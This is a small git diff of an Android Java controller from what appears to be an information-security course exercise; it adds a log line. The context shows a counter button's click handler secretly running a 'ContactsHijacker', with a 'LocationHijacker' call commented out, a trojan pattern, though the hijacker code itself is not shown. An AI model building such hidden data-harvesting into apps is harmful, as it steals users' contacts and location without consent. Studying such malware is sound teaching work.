@@ -1,6 +1,7 @@
 package com.seginfo.tp.seginfotp;
 
 import android.app.Activity;
+import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 
@@ -17,6 +18,7 @@ public class MyController implements OnClickListener {
     }
     
 	public void onClick(View v) {
+        Log.i("MyController", "clicked on counter");
         (new ContactsHijacker()).execute(activity);
 		//(new LocationHijacker()).execute(activity);
 		myModel.setValue();
